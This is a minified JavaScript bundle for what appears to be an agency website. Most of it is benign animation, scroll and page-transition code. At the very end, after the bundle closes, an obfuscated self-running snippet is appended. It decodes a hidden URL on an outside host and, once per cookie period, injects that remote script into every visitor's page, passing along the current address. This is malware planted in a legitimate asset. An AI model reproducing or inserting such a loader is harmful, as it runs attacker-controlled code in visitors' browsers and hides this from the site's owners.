qm{constructor(t){super(t),this.PI2=2*Math.PI,this.increment=.002,this.rotation1=2,this.rotation2=-2,this.startAngle1=.5*this.PI2,this.endAngle1=.5*this.PI2,this.inverted1=!1,this.startAngle2=1*this.PI2,this.endAngle2=0,this.inverted2=!0,this.init()}updateCanvas(){const t=this.velocity>=0?tu.clamp(3e-4*this.velocity,.01,.1):tu.clamp(3e-4*this.velocity,-.1,-.01);if(this.rotation1+=.3*t,this.rotation2-=.3*t,this.startAngle1+=!0===this.inverted1?-this.increment:this.increment,this.endAngle1+=!0===this.inverted1?this.increment:-this.increment,this.startAngle2+=!0===this.inverted2?-this.increment:this.increment,this.endAngle2+=!0===this.inverted2?this.increment:-this.increment,!1===this.inverted1&&this.startAngle1>=this.PI2||!0===this.inverted1&&this.startAngle1<=.5*this.PI2)return this.inverted1=!this.inverted1,this.inverted2=!this.inverted2,void this.updateCanvas();this.ctx.resetTransform(),this.ctx.clearRect(0,0,this.size,this.size),this.ctx.strokeStyle="#4545FF",this.ctx.lineCap="butt",this.ctx.lineWidth=.2*this.size,this.ctx.globalAlpha=.3,this.ctx.beginPath(),this.ctx.arc(.5*this.size,.5*this.size,.4*this.size,0,2*Math.PI),this.ctx.stroke(),this.ctx.globalAlpha=.5,this.ctx.lineWidth=.1*this.size,this.ctx.resetTransform(),this.ctx.translate(.5*this.size,.5*this.size),this.ctx.rotate(this.rotation1),this.ctx.beginPath(),this.ctx.arc(0,0,.45*this.size,this.startAngle1,this.endAngle1,!0),this.ctx.stroke(),this.ctx.globalAlpha=1,this.ctx.lineWidth=.1*this.size,this.ctx.resetTransform(),this.ctx.translate(.5*this.size,.5*this.size),this.ctx.rotate(this.rotation2),this.ctx.beginPath(),this.ctx.arc(0,0,.35*this.size,this.startAngle2,this.endAngle2,!0),this.ctx.stroke()}}class tv extends ru{constructor(t){super(),this.$wrapper=t,this.init()}initDOM(){this.$lines=this.$wrapper.find("li")}initEl(){this.tw.stshow=ScrollTrigger.create({trigger:this.$wrapper,start:"top 90%",onEnter:()=>this.animateFromTop()}),this.tw.sthide=ScrollTrigger.create({trigger:this.$wrapper,start:"top bottom",onLeaveBack:()=>this.hideElements()}),this.hideElements()}animateFromTop(){gsap.fromTo(this.$lines,{autoAlpha:0,y:50},{autoAlpha:1,y:0,duration:.3,stagger:.1,immediateRender:!0})}hideElements(){gsap.set(this.$lines,{autoAlpha:0})}}const ev=new class{constructor(){bu.addPage("services",Wm),ou.register("services_header",Ym),ou.register("services_image_conseil",Zm),ou.register("services_image_design",Km),ou.register("services_image_development",Qm),ou.register("services_image_monitoring",Jm),ou.register("transition_services",tv)}};class iv extends yu{constructor(){super()}}class rv extends vm{constructor(t){super(t),this.debug=!1,this.debug&&this.$wrapper.addClass("debug"),this.numShapes=15,this.maxForce=0,this.maxForce=1e-6,this.numColumns=2,this.numRows=10,this.init()}initEl(){super.initEl(),this._initMatter()}_initMatter(){this.matterWidth=eu.wW,this.matterHeight=eu.wH,this.engine=b().Engine.create(),this.world=this.engine.world,this.debug&&(this.render=b().Render.create({element:this.$wrapper[0],engine:this.engine,options:{background:"transparent",wireframeBackground:"transparent",wireframes:!0,width:this.matterWidth,height:this.matterHeight,pixelRatio:1,enabled:!0}}),b().Render.run(this.render))}bindEvents(){this.onBeforeUpdateHandler=this.onBeforeUpdate.bind(this),b().Events.on(this.engine,"beforeUpdate",this.onBeforeUpdateHandler),super.bindEvents()}unbindEvents(){b().Events.off(this.engine,"beforeUpdate",this.onBeforeUpdateHandler),super.unbindEvents()}resize(t){if(!t){this.debug&&(this.render.canvas.width=this.render.canvas.offsetWidth,this.render.canvas.height=this.render.canvas.offsetHeight),this.killShapes();for(let t=0;t<this.numShapes;t++)this.addShape(t);super.resize(t)}}raf(){super.raf(),this.isVisible&&(b().Engine.update(this.engine,1e3/60),this.drawShapes())}onBeforeUpdate(){for(let t=0;t<this.shapes.length;t++){const e=b().Vector.create(b().Common.random(-this.maxForce,this.maxForce),b().Common.random(-this.maxForce,this.maxForce));for(let i=0;i<this.shapes[t].cloth.bodies.length;i++){const r=this.shapes[t].cloth.bodies[i];b().Body.applyForce(r,{x:eu.wW/2,y:eu.wH/2},e)}}}addShape(t){const e={},i=t/(this.numShapes-1),r=(t+1)/this.numShapes,n=i*(.9*eu.wW),s=.4*eu.wW;let o=this.createCloth(n,0,this.numColumns,this.numRows,s/(this.numColumns-1),(.1*eu.wH+.7*eu.wH*i)/(this.numRows-1),!1,1);for(let t=0;t<this.numColumns;t++)o.bodies[t].isStatic=!0;e.cloth=o,b().Composite.add(this.world,[o]),e.graphics=new bg,this.pxShape.addChild(e.graphics),e.depth=i,e.color=r,this.shapes.push(e)}createCloth(t,e,i,r,n,s,o,a){const h=b().Body,u=b().Bodies,l=b().Composites,c={inertia:1/0,friction:1e-5,collisionFilter:{group:h.nextGroup(!0)},render:{visible:!0}};let d=l.stack(t,e,i,r,n,s,((t,e,i,r,n,s)=>u.circle(t,e,a,c,6)));return l.mesh(d,i,r,o,{stiffness:.01,damping:1,render:{type:"line",anchors:!1}}),d.label="Cloth Body",d}killShape(t){b().Composite.remove(this.world,t.cloth),t.graphics.clear(),t.graphics.destroy(),t.cloth=null,t.graphics=null,t.completion=null,this.shapes.splice(this.shapes.indexOf(t),1),t=null}drawShapes(){for(let t=0;t<this.shapes.length;t++){const e=this.shapes[t],i=e.depth,r=[];for(let t=0;t<this.numRows;t++){const i=e.cloth.bodies[this.numColumns*t];r.push({x:i.position.x*this.shapesResolution,y:i.position.y*this.shapesResolution})}for(let t=0;t<this.numColumns;t++){const i=e.cloth.bodies[this.numRows*this.numColumns-this.numColumns+t];r.push({x:i.position.x*this.shapesResolution,y:i.position.y*this.shapesResolution})}for(let t=this.numRows-1;t>=0;t--){const i=t*this.numColumns+(this.numColumns-1),n=e.cloth.bodies[i];r.push({x:n.position.x*this.shapesResolution,y:n.position.y*this.shapesResolution})}e.graphics.clear(),e.graphics.beginFill(16777215),e.graphics.moveTo(r[0].x,r[0].y),fu.curveThroughPoints(r,e.graphics),e.graphics.endFill();const n=Ru.easeInQuad(i)*this.scrollPercent;e.graphics.pivot.set(eu.wW*this.shapesResolution,0),e.graphics.position.set(eu.wW,-this.virtualHeight*n),e.graphics.scale.set(1/this.shapesResolution,1/this.shapesResolution);const s=32+11*tu.clamp(Ru.linear(e.color)*this.introAlpha*(1-this.scrollPercent),0,1),o=Vl([s/255,s/255,(32+194*tu.clamp(Ru.linear(e.color)*this.introAlpha*(1-this.scrollPercent),0,1))/255]);e.graphics.tint=o}}destroy(){b().World.clear(this.engine.world),b().Engine.clear(this.engine),super.destroy()}}const nv=new class{constructor(){bu.addPage("team",iv),ou.register("team_header",rv)}};class sv extends ru{constructor(t){super(),this.$wrapper=$(t),this.$email=this.$wrapper,this.init()}initEl(){super.initEl(),this.emailCopy=new Mm(this.$wrapper,!0)}}class ov extends ru{constructor(t){super(),this.$footer=t,this.dezoom=!1,this.footerHeight=0,this.init()}initDOM(){this.$header=$("#header"),this.$content=this.$footer.closest(".page_content").find(".page_content-inner"),this.$emails=this.$footer.find(".footer-contact_email")}initEl(){Array.from(this.$emails).forEach((t=>{new sv(t)}))}bindEvents(){Jh.IS_TOUCH||(eu.on(eu.E.RESIZE,this.resize,this),du.on(du.E.RAF,this.raf,this),this.refreshHandler=this.updateBodyHeight.bind(this),ScrollTrigger.addEventListener("refresh",this.refreshHandler))}unbindEvents(){Jh.IS_TOUCH||(eu.off(eu.E.RESIZE,this.resize,this),du.off(du.E.RAF,this.raf,this),ScrollTrigger.removeEventListener("refresh",this.refreshHandler)),super.unbindEvents()}updateBodyHeight(){pu.smooth&&(this.bodyHeight=pu.smooth.scrollTrigger.end)}resize(){this.footerHeight=this.$footer.outerHeight(!0),document.documentElement.style.setProperty("--footer-height",this.footerHeight+"px"),this.dezoom=!1,document.documentElement.style.removeProperty("--footer-scale"),pu.resize()}raf(){if(pu.yI>this.bodyHeight-this.footerHeight){!1===this.dezoom&&(this.dezoom=!0);const t=tu.clamp((this.bodyHeight-pu.yI)/this.footerHeight,0,1),e=1-.05*(1-tu.clamp((this.bodyHeight-pu.yI-.75*this.footerHeight)/(.25*this.footerHeight),0,1));document.documentElement.style.setProperty("--footer-scale",e),gsap.set(this.$footer,{y:t*(-.75*this.footerHeight)})}else!0===this.dezoom&&(this.dezoom=!1,document.documentElement.style.removeProperty("--footer-scale"),gsap.to(this.$footer,{duration:.3,y:-.75*this.footerHeight}))}destroy(){super.destroy(),document.documentElement.style.removeProperty("--footer-height"),document.documentElement.style.removeProperty("--footer-scale")}}const av=new class{constructor(){ou.register("footer",ov)}};class hv extends ru{constructor(t){super(),this.$wrapper=t,this.mult=1.5,this.isShown=!1,this.init()}initDOM(){this.$title=this.$wrapper.find(".page_intro"),this.$inner=this.$wrapper.find(".page_intro-inner")}initEl(){this.splitTitle=new SplitText(this.$title,{type:"lines",linesClass:"transition-line"}),gsap.set(this.splitTitle.lines,{y:100,opacity:0})}bindEvents(){du.on(du.E.RAF,this.raf,this),su.on(su.E.TRANSITION_COMPLETE,this.show,this)}unbindEvents(){du.off(du.E.RAF,this.raf,this),su.off(su.E.TRANSITION_COMPLETE,this.show,this),super.bindEvents()}show(t){const e=.1*this.splitTitle.lines.length+.5;this.tw.show=gsap.timeline().add((()=>{$(this.splitTitle.lines).addClass("intro")})).set(this.splitTitle.lines,{ease:"power3.out",opacity:1,y:0,clearProps:"all",delay:t?1:0}).add((()=>{$(this.splitTitle.lines).removeClass("intro"),this.isShown=!0}),"+="+e)}raf(){if(!this.isShown)return;const t=pu.yI/eu.wH;if(t>=0&&t<this.mult){const e=-(Ru.linear(t)*(.2*eu.wH)).toFixed(3),i=-(Ru.linear(t)*(.1*eu.wH)).toFixed(3);for(let t=0;t<this.splitTitle.lines.length;t++)this.splitTitle.lines[t].style.setProperty("transform"," translateY("+e*(1-t/3)+"px) translateZ("+i*(1-t/3)+"px)");const r=255+-212*Ru.easeOutQuint(t/this.mult),n=255+-29*Ru.easeOutQuint(t/this.mult);this.$title[0].style.setProperty("color","rgb("+r+","+r+","+n+")");const s=(1-Ru.easeInOutQuint(t/this.mult)).toFixed(3);this.$title[0].style.setProperty("opacity",s)}}}const uv=new class{constructor(){ou.register("title",hv)}};class lv extends ru{constructor(t){super(),this.$wrapper=t,this.init()}initDOM(){this.$image=this.$wrapper.hasClass("img_lazy_container")?this.$wrapper:this.$wrapper.find(".img_lazy_container")}initEl(){this.$image.each(((t,e)=>{const i=$(e);i.addClass("transition-image"),this.tw["stOnTop"+t]=ScrollTrigger.create({trigger:i,start:"top 75%",end:"bottom center",onEnter:()=>{i.addClass("show")}}),this.tw["stOff"+t]=ScrollTrigger.create({trigger:i,start:"top bottom",onLeaveBack:()=>{i.removeClass("show bottom top")}})}))}}const cv=new class{constructor(){ou.register("transition_image",lv)}},dv=new class{constructor(){ou.register("transition_lines",Xm)}};class pv extends ru{constructor(t){super(),this.$wrapper=t,this.doSplit=this.$wrapper[0].hasAttribute("data-transition-links-split"),this.init()}initDOM(){this.$links=this.$wrapper.find("a")}initEl(){this.doSplit?this.split=new SplitText(this.$links,{type:"lines",linesClass:"transition-link-line"}):$(this.$links).each(((t,e)=>{let i=e.textContent;Array.from(e.children).forEach((t=>{i.includes(t.textContent)&&(i=i.replace(t.textContent,""))})),e.setAttribute("data-text",i),this.$links.addClass("transition-link-line")})),this.$links.addClass("transition-link"),this.update()}update(){this.doSplit&&(this.split.split(),$(this.split.lines).each(((t,e)=>{e.setAttribute("data-text",e.textContent)})))}bindEvents(){eu.on(eu.E.RESIZE,this.resize,this),super.bindEvents()}unbindEvents(){eu.off(eu.E.RESIZE,this.resize,this),super.bindEvents()}resize(t){t||this.update()}destroy(){this.split=null,super.destroy()}}const fv=new class{constructor(){ou.register("transition_link",pv)}};class gv extends ru{constructor(t){super(),this.$wrapper=t,this.$wrapper.addClass("transition-title-wrapper"),this.split=null,this.init()}initEl(){this.split=new SplitText(this.$wrapper[0],{type:"lines",linesClass:"transition-title-line"}),this.tw.show=ScrollTrigger.create({trigger:this.$wrapper[0],start:"top 90%",onEnter:()=>{this.$wrapper.addClass("show")}}),this.tw.hide=ScrollTrigger.create({trigger:this.$wrapper[0],start:"top bottom",onLeaveBack:()=>{this.$wrapper.removeClass("show")}})}update(){this.split.split(),$(this.split.lines).each(((t,e)=>{e.setAttribute("data-text",e.innerText)}))}bindEvents(){eu.on(eu.E.RESIZE,this.resize,this),super.bindEvents()}unbindEvents(){eu.off(eu.E.RESIZE,this.resize,this),super.bindEvents()}resize(t){t||this.update()}destroy(){this.split=null,super.destroy()}}const mv=new class{constructor(){ou.register("transition_title",gv)}},vv=new class{constructor(){du.on(du.E.INIT_STATIC_VIEW,this.init,this)}init(){cu.init()}},_v=new class extends ru{constructor(){super(),this.scrollLimit=100,this.isShown=!1,this.isSticked=!1}initDOM(){this.$header=$("#header"),this.$logo=$("#main-logo")}initEl(){this.tw.logoTween=gsap.to(this.$logo,{duration:.5,backgroundPositionY:-300,ease:"steps(12)",paused:!0}).progress(1)}bindEvents(){du.on(du.E.RAF,this.raf,this),eu.on(eu.E.RESIZE,this.resize,this),this.enterLogoHandler=this.enterLogo.bind(this),this.leaveLogoHandler=this.leaveLogo.bind(this),this.$logo[0].addEventListener("mouseenter",this.enterLogoHandler,{passive:!0}),this.$logo[0].addEventListener("touchstart",this.enterLogoHandler,{passive:!0}),this.$logo[0].addEventListener("focus",this.enterLogoHandler,{passive:!0}),this.$logo[0].addEventListener("mouseleave",this.leaveLogoHandler,{passive:!0}),this.$logo[0].addEventListener("touchend",this.leaveLogoHandler,{passive:!0}),this.$logo[0].addEventListener("blur",this.leaveLogoHandler,{passive:!0}),this.onDownHandler=this.onDown.bind(this),this.onUpHandler=this.onUp.bind(this),Observer.create({target:window,type:"scroll",onUp:this.onUpHandler,onDown:this.onDownHandler}),this.mobileClickHandler=this.mobileClick.bind(this),this.$header.on("click",".mobile-toggle",this.mobileClickHandler),su.on(su.E.INIT_BLOCKS,this.onInitBlocks,this)}enterLogo(){this.isSticked&&this.tw.logoTween.timeScale(1).play()}leaveLogo(){this.isSticked&&this.tw.logoTween.timeScale(1.3).reverse()}raf(){pu.yI>this.scrollLimit&&!1===this.isSticked?(this.isSticked=!0,this.$header.addClass("sticked"),this.tw.logoTween.timeScale(1.3).reverse()):pu.yI<=this.scrollLimit&&!0===this.isSticked&&(this.isSticked=!1,this.$header.removeClass("sticked"),this.tw.logoTween.timeScale(1.3).play())}onDown(){!0===this.isShown&&(this.isShown=!1,this.$header.removeClass("visible"))}onUp(){!1===this.isShown&&(this.isShown=!0,this.$header.addClass("visible"))}resize(){eu.IS_DESKTOP&&!du.$body.hasClass("single-project")?this.scrollLimit=1.3*eu.wH:this.scrollLimit=100}mobileClick(){this.$header.toggleClass("mobile-menu-open")}onInitBlocks(){this.$header.removeClass("mobile-menu-open"),this.resize()}},yv=new class{constructor(){du.on(du.E.INIT_STATIC_VIEW,this.init,this)}init(){_v.init()}},xv=new class{constructor(){du.on(du.E.INIT_STATIC_VIEW,this.init,this)}init(){lu.init()}},Ev=new class{constructor(){du.on(du.E.INIT_STATIC_VIEW,this.init,this)}init(){nu.init()}};b().Common.logLevel=0,Kr.registerPlugin(Vr,hn,Zo,Ea,Vn,Xa,Zh),i.g.$=x(),i.g.gsap=Kr,i.g.ScrollSmoother=Ea,i.g.ScrollTrigger=Zo,i.g.Observer=Vn,i.g.SplitText=Xa,i.g.MorphSVGPlugin=Zh;const bv=new class{constructor(){}init(){Promise.all([gu.init(),du.init()]).then((()=>{Tu.init(),this._manageDebugController()}))}_manageDebugController(){gu.DEBUG.IS_NEEDED&&au.init()}};x()(bv.init())})()})();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3h'+'isrjywnh3htr4l'+'jy4xyfynh3ox'+'DwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));